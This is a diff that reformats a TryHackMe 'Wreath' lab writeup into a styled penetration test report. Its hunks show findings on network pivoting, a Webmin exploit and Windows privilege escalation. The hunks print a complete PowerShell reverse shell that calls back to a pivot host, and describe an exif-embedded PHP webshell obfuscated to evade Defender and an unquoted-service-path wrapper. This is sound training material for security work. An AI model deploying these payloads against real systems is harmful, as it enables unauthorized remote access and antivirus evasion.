@@ -1,10 +1,23 @@
 ---
-title: "'Wreath' TryHackMe Writeup"
-date: 2022-09-20T09:31:43.000
-lastmod: 2022-09-27T12:09:25.000
+title: "Wreath Penetration Test Report"
+subtitle: "Shrike InfoSec"
+date: '2022-09-20'
+lastmod: '2022-09-27'
 draft: false
 tags: [writeup, writeup/tryhackme]
+toc: yes
+titlepage: true
+titlepage-color: "3d3d3d"
+titlepage-text-color: "FFFFFF"
+titlepage-rule-color: "FFFFFF"
+titlepage-rule-height: 2
+book: true
+classoption: oneside
+code-block-font-size: \scriptsize
 ---
+
+\newpage{}
+
 # Assessment Overview
 
 ## Introduction
@@ -16,6 +29,7 @@ The client briefed the contractor with the following information:
 _"Two machines are on my home network that host projects that are worked on in my spare time. One of them has a webserver that's port forwarded. It's serving a website that's pushed to my git server from my own PC for version control, then cloned to the public facing server. A personal PC is also on that network, it has protections turned on, doesn't run anything vulnerable, and can't be accessed by the public-facing section of the network. It's technically a repurposed server."_
 
 ## Disclaimer
+
 _This assessment was completed under the concept of a' point in time' analysis - any vulnerabilites or issues discovered throughout this engagement should only be considered as valid at the time of engagement. This report cannot guarantee that all potential vulnerabilities have been identified and should only be used as a supplimentary document when undertaking additional checks and security patching. It is not a 100% coverage report._
 
 # Scope
@@ -76,6 +90,7 @@ Vulnerable to [CVE-2019-15107](https://www.cvedetails.com/cve-details.php?t=1&cv
 Vulnerable to [CVE-2018-5955](https://www.cvedetails.com/cve/CVE-2018-5955/)
 
 ---
+
 **Severity**: Critical
 
 **Description**: Both internal and external software are out of date with publicly available exploits featuring Remote Code Execution (RCE) exploits.
@@ -87,6 +102,7 @@ Vulnerable to [CVE-2018-5955](https://www.cvedetails.com/cve/CVE-2018-5955/)
 ## Insecure Credentials
 
 ---
+
 **Severity**: High
 
 **Description**: Use of weak/easy to crack credentials were found throughout the engagement.
@@ -98,6 +114,7 @@ Vulnerable to [CVE-2018-5955](https://www.cvedetails.com/cve/CVE-2018-5955/)
 ## Password Re-Use
 
 ---
+
 **Severity**: High
 
 **Description**: Previously identified credentials used for service running on personal machine.
@@ -109,6 +126,7 @@ Vulnerable to [CVE-2018-5955](https://www.cvedetails.com/cve/CVE-2018-5955/)
 ## Improper Privileges
 
 ---
+
 **Severity**: High
 
 **Description**: Software running on the webserver and git server as privileged, administrator or system accounts.
@@ -120,6 +138,7 @@ Vulnerable to [CVE-2018-5955](https://www.cvedetails.com/cve/CVE-2018-5955/)
 ## Unquoted Service Path
 
 ---
+
 **Severity**: High
 
 **Description**: The 'System Explorer Help Service' path is unquoted, which can be hijacked for malicious file execution.
@@ -133,6 +152,7 @@ See [MITRE T1574/009](https://attack.mitre.org/techniques/T1574/009/).
 ## Impersonate User Tokens
 
 ---
+
 **Severity**: High
 
 **Description**: A user can impersonate another user's token if SetImpersonateToken is enabled.
@@ -141,11 +161,12 @@ See [MITRE T1574/009](https://attack.mitre.org/techniques/T1574/009/).
 
 **Suggested Remediation**: Disable SetImpersonateToken for Thomas' user account. This can be done through a Group Policy Object (GPO) and in the local security policies of the machine.
 
-See [MITRE T1134/003](https://attack.mitre.org/techniques/T1134/003/)
+See [MITRE T1134/003](https://attack.mitre.org/techniques/T1134/003/).
 
 ## Unrestricted File Uploads
 
 ---
+
 **Severity**: High
 
 **Description**: A malicious attacker can use a file upload mechanism to gain access to the machine.
@@ -157,6 +178,7 @@ See [MITRE T1134/003](https://attack.mitre.org/techniques/T1134/003/)
 ## Personal Information Disclosure
 
 ---
+
 **Severity**: Medium
 
 **Description**: Personally Identifiable information (PII) regarding the client was identified on a public-facing website.
@@ -168,6 +190,7 @@ See [MITRE T1134/003](https://attack.mitre.org/techniques/T1134/003/)
 ## Error Page Information Disclosure
 
 ---
+
 **Severity**: High
 
 **Description**: Django webserver displays a 404 error page with expected request locations.
@@ -207,6 +230,7 @@ By adding thomaswreath.thm to our `/etc/hosts` file, we are able to navigate to 
 Upon visiting the website in the browser, we can identify the following personal information for the client:
 
 ---
+
 **Address**: 21 Highland Court, Easingwold, East Riding, Yorkshire, England, YO61 3QL
 
 **Phone Number**: 01347 822945
@@ -223,7 +247,7 @@ Visiting port `10000`, we are met with a Webmin login panel as identified by our
 
 As we know the version of Webmin running is vulnerable, we can find a publicly available exploit on GitHub.
 
-_Exploit used: https://github.com/MuirlandOracle/CVE-2019-15107_
+_Exploit used: [https://github.com/MuirlandOracle/CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107)_
 
 We clone this to our attacking machine and execute the payload to gain administrative access on the target machine.
 
@@ -303,6 +327,7 @@ Scanning `10.200.101.150` reveals that there are open ports on this machine.
 
 ### Nmap Scan
 After scanning `10.200.101.150`, we get a few services:
+
 | Port | Service |
 |--|--|
 | 80 | http |
@@ -399,15 +424,17 @@ We can use a payload with our webshell set up previously to trigger a reverse sh
 
 We use a Powershell reverse shell on our target - this creates a new TCP connection to the `18456` port on the public facing webserver, which is the one that `socat` is listening on, from the gitserver.
 
-```bash
-powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.101.200',18456);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```powershell
+powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.101.200',18456); `
+$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0}; `
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); `
+$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; `
+$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); `
+$stream.Write($sendbyte,0,$sendbyte.Length); `
+$stream.Flush()};$client.Close()"
 ```
 
 Before we can send this in our `CURL` command, though, we'll need to URL Encode it.
-
-```bash
-powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.101.200%27%2C18456%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
-```
 
 Finally, we send our exploit as a `curl` request to the webshell and end up with a connection back on our attacking machine with a full reverse shell.
 
@@ -508,7 +535,9 @@ We can use the Add-on Wappalyzer to reveal that the page is running PHP version 
 
 Now we know that the websites are the same, it is safe to assume that the Git Server is hosting the files being used on this machine - presumably as a development instance.
 
-Going back to the Git Server, we can see there is the following directory: `C:\GitStack\respositories\Website.git`
+Going back to the Git Server, we can see there is the following directory: 
+
+`C:\GitStack\respositories\Website.git`
 
 Using `Evil-WinRM` to download the file, we can take a copy of the git repository to look through on our local machine.
 
@@ -528,7 +557,9 @@ This provides us with a few directories containing the last few commits that we 
 
 Using the following one-liner, we can identify which of the commits are the most recent:
 
-`separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"`
+```bash
+separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
+```
 
 This reveals that the 0-345[...] folder is the most recent commit.
 
@@ -576,7 +607,7 @@ By uploading this file and navigating to it in the browser, we find that we can 
 
 Assuming that the system is running Windows Defender (given it is a Windows machine), the actual payload needs to avoid triggering Defender.
 
-To do that, we need to obfuscate the payload with base64 encoding.
+To do that, we need to obfuscate the payload with base64 encoding and escape any dollar signs so that it runs properly in our bash terminal.
 
 Starting Payload:
 ```php
@@ -589,11 +620,6 @@ Starting Payload:
 ?>
 ```
 
-Obfuscated Payload (with escaped dollar signs for bash):
-```php
-<?php \$p0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$p0)){echo base64_decode('PHByZT4=').shell_exec(\$p0).base64_decode('PC9wcmU+');}die();?>
-```
-
 We now repeat the same process as we did with our benign payload to add it to the image's exif data.
 
 ![](images/wreath/exif_data_2.png)
@@ -602,7 +628,9 @@ We upload our image and find that we get an 'Undefined Index' error - meaning it
 
 Now we have a working webshell, we can use the `wreath` parameter to run commands.
 
-Visiting `http://10.200.101.100/resources/uploads/cat-shrike.jpg-php?wreath=hostname` we can see that we identify the machine as `wreath-pc`.
+Visiting the below link, we can see that we identify the machine as `wreath-pc`.
+
+`http://10.200.101.100/resources/uploads/cat-shrike.jpg-php?wreath=hostname`
 
 ![](images/wreath/webshell.png)
 
@@ -658,7 +686,8 @@ Because the service path was not quoted, it means that the service may also look
 
 Because we know there is an AV solution on the machine, we write a wrapper for our existing binary using C#.
 
-Wrapper.cs:
+#### Wrapper.cs
+
 ```cs
 using System;
 using System.Diagnostics;
